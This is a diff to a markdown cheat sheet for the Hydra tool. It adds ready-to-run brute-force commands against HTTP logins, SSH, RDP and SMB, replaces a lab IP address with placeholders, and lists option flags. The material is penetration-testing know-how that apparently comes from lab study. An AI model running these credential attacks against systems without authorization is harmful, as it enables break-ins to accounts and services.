@@ -15,17 +15,52 @@ Help
 hydra -h
 ```
 
+Bruteforce Web Login (username:password)
+```bash
+hydra -C wordlist.txt <ip> -s <port> http-get /
+```
+
+Bruteforce Username
+```bash
+hydra -L user.list -p password -f <ip> -s <port> http-get /
+```
+
+Bruteforce Password
+```bash
+hydra -l username -P password.list -f <ip> -s <port> http-get /
+```
+
 Bruteforce SSH
 ```bash
-hydra -L user.list -P password.list ssh://10.129.42.197
+hydra -L user.list -P password.list ssh://<ip>
 ```
 
 Bruteforce RDP
 ```bash
-hydra -L user.list -P password.list rdp://10.129.42.197
+hydra -L user.list -P password.list rdp://<ip>
 ```
 
 Bruteforce SMB
 ```bash
-hydra -L user.list -P password.list smb://10.129.42.197
+hydra -L user.list -P password.list smb://<ip>
+```
+
+Stop after successful login
+```bash
+-f
+```
+
+Try all users on each password
+```bash
+-u
+```
+
+Set username
+```bash
+-l test
+```
+
+Set password
+```bash
+-p test
 ```
